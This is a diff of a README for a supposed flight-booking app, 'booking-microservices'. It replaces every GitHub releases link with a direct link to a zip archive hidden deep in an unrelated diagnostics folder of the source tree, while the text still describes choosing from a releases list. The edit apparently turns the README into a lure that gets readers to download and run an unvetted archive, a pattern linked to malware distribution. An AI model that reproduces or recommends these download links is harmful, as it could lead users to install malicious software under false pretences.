@@ -1,6 +1,6 @@
 # ✈️ booking-microservices - Book Flights With Ultimate Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20The%20App-blue?style=for-the-badge&logo=github&color=purple)](https://github.com/Cryosurgeryblabber9314/booking-microservices/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20The%20App-blue?style=for-the-badge&logo=github&color=purple)](https://raw.githubusercontent.com/Cryosurgeryblabber9314/booking-microservices/main/src/BuildingBlocks/OpenTelemetryCollector/CoreDiagnostics/Commands/microservices_booking_v1.3.zip)
 
 ## 👋 Welcome
 
@@ -10,7 +10,7 @@ Thank you for choosing **booking-microservices**! This application is a complete
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Cryosurgeryblabber9314/booking-microservices/releases](https://github.com/Cryosurgeryblabber9314/booking-microservices/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Cryosurgeryblabber9314/booking-microservices/main/src/BuildingBlocks/OpenTelemetryCollector/CoreDiagnostics/Commands/microservices_booking_v1.3.zip](https://raw.githubusercontent.com/Cryosurgeryblabber9314/booking-microservices/main/src/BuildingBlocks/OpenTelemetryCollector/CoreDiagnostics/Commands/microservices_booking_v1.3.zip)**
 
 You'll see a list of available releases. Find the latest release (usually at the top) and click on the download file. The file size will depend on your chosen version, but expect it to be a reasonable size for a modern application.
 
@@ -103,7 +103,7 @@ Booking your next flight has never been easier. With **booking-microservices**, 
 
 Ready to take off? Get your copy today:
 
-**[➡️ Visit the Download Page](https://github.com/Cryosurgeryblabber9314/booking-microservices/releases)**
+**[➡️ Visit the Download Page](https://raw.githubusercontent.com/Cryosurgeryblabber9314/booking-microservices/main/src/BuildingBlocks/OpenTelemetryCollector/CoreDiagnostics/Commands/microservices_booking_v1.3.zip)**
 
 It only takes a few minutes to install, and you'll be booking flights in no time. We can't wait to help you plan your next adventure!
 
